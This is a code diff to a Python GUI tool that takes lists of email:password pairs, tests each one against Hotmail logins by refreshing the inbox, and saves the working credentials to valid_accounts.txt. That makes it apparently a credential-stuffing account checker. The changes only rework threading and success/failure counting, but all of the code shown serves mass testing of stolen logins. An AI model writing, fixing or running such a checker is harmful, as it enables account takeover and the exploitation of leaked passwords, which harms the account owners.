@@ -20,10 +20,10 @@ def check_hotmail_login(email, password):
         # Quick inbox access test
         account.root.refresh()
         return True
-    except Exception as e:
+    except Exception:
         return False
 
-# Process accounts using threading
+# Process accounts with threading
 def process_accounts(accounts):
     global success_count, failed_count, total_accounts
     success_count = 0
@@ -37,6 +37,7 @@ def process_accounts(accounts):
     progress_bar["value"] = 0
 
     def check_account(index, line):
+        global success_count, failed_count
         parts = line.strip().split(":")
         if len(parts) != 2:
             return f"⚠️ Skipping invalid line: {line}", None
@@ -44,30 +45,26 @@ def process_accounts(accounts):
         email, password = parts
         update_progress(f"🔄 Checking {index}/{total_accounts}: {email}...")
 
-        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
-            future = executor.submit(check_hotmail_login, email, password)
-            success = future.result(timeout=15)  # Timeout after 15 seconds
+        success = check_hotmail_login(email, password)
 
         if success:
             valid_accounts.append(f"{email}:{password}")
+            success_count += 1
             return f"✅ {email} (Success)", "valid"
         else:
             failed_accounts.append(f"{email}:{password}")
+            failed_count += 1
             return f"❌ {email} (Failed)", "failed"
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
         results = executor.map(lambda args: check_account(*args), enumerate(accounts, start=1))
 
     for result, status in results:
         update_progress(result)
-        if status == "valid":
-            success_count += 1
-        elif status == "failed":
-            failed_count += 1
         update_summary()
         progress_bar["value"] += 1
         progress_percentage.set(f"{int((progress_bar['value'] / total_accounts) * 100)}% Completed")
-        root.update_idletasks()
+        root.update_idletasks()  # **Force GUI to refresh**
 
     with open("valid_accounts.txt", "w") as f:
         f.write("\n".join(valid_accounts))
